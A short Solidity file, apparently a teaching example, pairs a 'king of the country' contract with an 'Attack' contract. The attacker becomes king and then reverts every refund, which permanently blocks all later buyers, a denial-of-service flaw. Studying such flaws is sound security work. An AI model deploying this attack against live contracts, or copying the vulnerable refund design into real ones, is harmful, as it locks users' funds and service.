pragma solidity ^0.4.10;

contract kingOfCountry {
    address public king;
    uint256 price;

    function kingOfCountry(uint256 _price) {
        require(_price > 0);
        price = _price;
        king = msg.sender;
    }

    function becomeking() payable {
        require(msg.value > price); // 付錢當國王
        king.transfer(price);   // 給前任補償
        king = msg.sender;      // 加冕新國王
        price = price * 2;           // 付兩倍的錢當新國王
    }
}
contract Attack {
    function () { revert(); }
    
    function Attack(address _target) payable {
        _target.call.value(msg.value)(bytes4(keccak256("becomeking()")));
    }
}
